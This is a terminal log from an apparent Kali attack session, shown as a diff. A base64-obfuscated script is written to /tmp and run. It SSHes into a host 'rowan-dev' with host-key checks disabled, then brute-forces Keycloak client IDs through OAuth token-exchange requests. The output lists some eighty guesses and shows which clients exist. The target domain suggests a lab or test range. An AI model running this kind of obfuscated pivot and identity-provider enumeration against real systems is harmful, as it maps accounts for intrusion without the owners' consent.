@@ -1,0 +1,88 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r22.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKST1odHRwczovL2lkZW50aXR5LmtlcGxlcm9wcy50ZXN0ClQ9IiRJL3JlYWxtcy9rZXBsZXJvcHMvcHJvdG9jb2wvb3BlbmlkLWNvbm5lY3QvdG9rZW4iCk5BTUVTPSJ3b3Jrc3BhY2Ugd29ya3NwYWNlLWNsaWVudCB3b3Jrc3BhY2UtY2xpIGZpZWxka2VzdC13b3Jrc3BhY2UgZmllbGRsaW5rLXdvcmtzcGFjZSByb3dhbi13b3Jrc3BhY2Ugd29ya2xvYWQgd29ya2xvYWQtY2xpZW50IGZpZWxkbGluay13b3JrbG9hZCBmaWVsZGtlc3Qtd29ya2xvYWQgZmllbGRsaW5rLXN1cHBvcnQgc3VwcG9ydCBzdXBwb3J0LWNsaWVudCBzdXBwb3J0LWV4cG9ydCBzdXBwb3J0LWV4cG9ydC1yZWFkZXIgZXhwb3J0LXJlYWRlciBmaWVsZGtlc3QtZXhwb3J0IGNsb3VkLWFwaSBjbG91ZCBjbG91ZC1jbGllbnQgZGF0YSBvYmplY3RzIGZpZWxka2VzdC1jbGllbnQgZmllbGRsaW5rLWNsaWVudCBmaWVsZGtlc3QgZmllbGRsaW5rIHJvd2FuIHJvd2FuLml0byBtYXlhIG1heWEucmFuc2NvbWJlIGFwaSBleGNoYW5nZSB0b2tlbi1leGNoYW5nZSBzdHMga2VwbGVyb3BzIGstZGV2IGNvbm5lY3RvciBjb25uZWN0b3ItY2xpZW50IHByZXZpZXcgaW5kZXhlciBzdGFmZiB0aWNrZXRzIGFzc2lzdGFudCByZXZpZXcgc291cmNlIGNpIHBhY2thZ2VzIGNlcnQgY2EgaWRlbnRpdHkgYWRtaW4tY2xpIGFjY291bnQgYWNjb3VudC1jb25zb2xlIHNlY3VyaXR5LWFkbWluLWNvbnNvbGUgYnJva2VyIHJlYWxtLW1hbmFnZW1lbnQgZmllbGRrZXN0LWNsaSBmaWVsZGxpbmstY2xpIHN1cHBvcnQtY2xpZW50IGZpZWxka2VzdC1zdXBwb3J0IGV4cG9ydCBleHBvcnQtY2xpZW50IGV4cG9ydHMgd29ya2xvYWQtaWRlbnRpdHkgd29ya2xvYWQtaWRlbnRpdHktY2xpZW50IGZpZWxkbGluay1pZGVudGl0eSBpZGVudGl0eS1jbGllbnQgdHJ1c3QgdHJ1c3QtY2xpZW50IHRydXN0LXJlYWRlciB0cnVzdC1yZWNvcmRzIHNjaGVkdWxlIHNjaGVkdWxlcyBzY2hlZHVsZXIgbWFpbnRlbmFuY2UgcG9saWN5IHBvbGljaWVzIGJ1aWxkLXJlY29yZHMiCmZvciBjIGluICROQU1FUzsgZG8KIHI9JChjdXJsIC1zU2sgLW0gNiAtbyAvdG1wL28gLXcgJyV7aHR0cF9jb2RlfScgLWQgImdyYW50X3R5cGU9dXJuOmlldGY6cGFyYW1zOm9hdXRoOmdyYW50LXR5cGU6dG9rZW4tZXhjaGFuZ2UmY2xpZW50X2lkPSRjIiAiJFQiKQogZT0kKHB5dGhvbjMgLWMgImltcG9ydCBqc29uLHN5cwp0cnk6CiBkPWpzb24ubG9hZChvcGVuKCcvdG1wL28nKSk7cHJpbnQoZC5nZXQoJ2Vycm9yJywnJykrJyB8ICcrc3RyKGQuZ2V0KCdlcnJvcl9kZXNjcmlwdGlvbicsJycpKSkKZXhjZXB0OnByaW50KG9wZW4oJy90bXAvbycpLnJlYWQoKVs6ODBdKSIpCiBlY2hvICIkYyAtPiAkciA6OiAkZSIKZG9uZQpSU0gKZWNobyBET05FX0sxNF9SMjIK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r22.sh; bash /tmp/k14_r22.sh; echo DONEMARK_1795201637659$((6*7))
+workspace -> 401 :: invalid_client | Invalid client or Invalid client credentials
+workspace-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+workspace-cli -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldkest-workspace -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldlink-workspace -> 401 :: invalid_client | Invalid client or Invalid client credentials
+rowan-workspace -> 401 :: invalid_client | Invalid client or Invalid client credentials
+workload -> 401 :: invalid_client | Invalid client or Invalid client credentials
+workload-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldlink-workload -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldkest-workload -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldlink-support -> 401 :: invalid_client | Invalid client or Invalid client credentials
+support -> 401 :: invalid_client | Invalid client or Invalid client credentials
+support-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+support-export -> 401 :: invalid_client | Invalid client or Invalid client credentials
+support-export-reader -> 401 :: invalid_client | Invalid client or Invalid client credentials
+export-reader -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldkest-export -> 401 :: invalid_client | Invalid client or Invalid client credentials
+cloud-api -> 401 :: invalid_client | Invalid client or Invalid client credentials
+cloud -> 401 :: invalid_client | Invalid client or Invalid client credentials
+cloud-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+data -> 401 :: invalid_client | Invalid client or Invalid client credentials
+objects -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldkest-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldlink-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldkest -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldlink -> 401 :: invalid_client | Invalid client or Invalid client credentials
+rowan -> 401 :: invalid_client | Invalid client or Invalid client credentials
+rowan.ito -> 401 :: invalid_client | Invalid client or Invalid client credentials
+maya -> 401 :: invalid_client | Invalid client or Invalid client credentials
+maya.ranscombe -> 401 :: invalid_client | Invalid client or Invalid client credentials
+api -> 401 :: invalid_client | Invalid client or Invalid client credentials
+exchange -> 401 :: invalid_client | Invalid client or Invalid client credentials
+token-exchange -> 401 :: invalid_client | Invalid client or Invalid client credentials
+sts -> 401 :: invalid_client | Invalid client or Invalid client credentials
+keplerops -> 401 :: invalid_client | Invalid client or Invalid client credentials
+k-dev -> 401 :: invalid_client | Invalid client or Invalid client credentials
+connector -> 401 :: invalid_client | Invalid client or Invalid client credentials
+connector-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+preview -> 401 :: invalid_client | Invalid client or Invalid client credentials
+indexer -> 401 :: invalid_client | Invalid client or Invalid client credentials
+staff -> 401 :: invalid_client | Invalid client or Invalid client credentials
+tickets -> 401 :: invalid_client | Invalid client or Invalid client credentials
+assistant -> 401 :: invalid_client | Invalid client or Invalid client credentials
+review -> 401 :: invalid_client | Invalid client or Invalid client credentials
+source -> 401 :: invalid_client | Invalid client or Invalid client credentials
+ci -> 401 :: invalid_client | Invalid client or Invalid client credentials
+packages -> 401 :: invalid_client | Invalid client or Invalid client credentials
+cert -> 401 :: invalid_client | Invalid client or Invalid client credentials
+ca -> 401 :: invalid_client | Invalid client or Invalid client credentials
+identity -> 401 :: invalid_client | Invalid client or Invalid client credentials
+admin-cli -> 400 :: invalid_request | Standard token exchange is not enabled for the requested client
+account -> 400 :: invalid_request | Standard token exchange is not enabled for the requested client
+account-console -> 400 :: invalid_request | Standard token exchange is not enabled for the requested client
+security-admin-console -> 400 :: invalid_request | Standard token exchange is not enabled for the requested client
+broker -> 401 :: unauthorized_client | Invalid client or Invalid client credentials
+realm-management -> 401 :: unauthorized_client | Invalid client or Invalid client credentials
+fieldkest-cli -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldlink-cli -> 401 :: invalid_client | Invalid client or Invalid client credentials
+support-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldkest-support -> 401 :: invalid_client | Invalid client or Invalid client credentials
+export -> 401 :: invalid_client | Invalid client or Invalid client credentials
+export-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+exports -> 401 :: invalid_client | Invalid client or Invalid client credentials
+workload-identity -> 401 :: invalid_client | Invalid client or Invalid client credentials
+workload-identity-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+fieldlink-identity -> 401 :: invalid_client | Invalid client or Invalid client credentials
+identity-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+trust -> 401 :: invalid_client | Invalid client or Invalid client credentials
+trust-client -> 401 :: invalid_client | Invalid client or Invalid client credentials
+trust-reader -> 401 :: invalid_client | Invalid client or Invalid client credentials
+trust-records -> 401 :: invalid_client | Invalid client or Invalid client credentials
+schedule -> 401 :: invalid_client | Invalid client or Invalid client credentials
+schedules -> 401 :: invalid_client | Invalid client or Invalid client credentials
+scheduler -> 401 :: invalid_client | Invalid client or Invalid client credentials
+maintenance -> 401 :: invalid_client | Invalid client or Invalid client credentials
+policy -> 401 :: invalid_client | Invalid client or Invalid client credentials
+policies -> 401 :: invalid_client | Invalid client or Invalid client credentials
+build-records -> 401 :: invalid_client | Invalid client or Invalid client credentials
+DONE_K14_R22
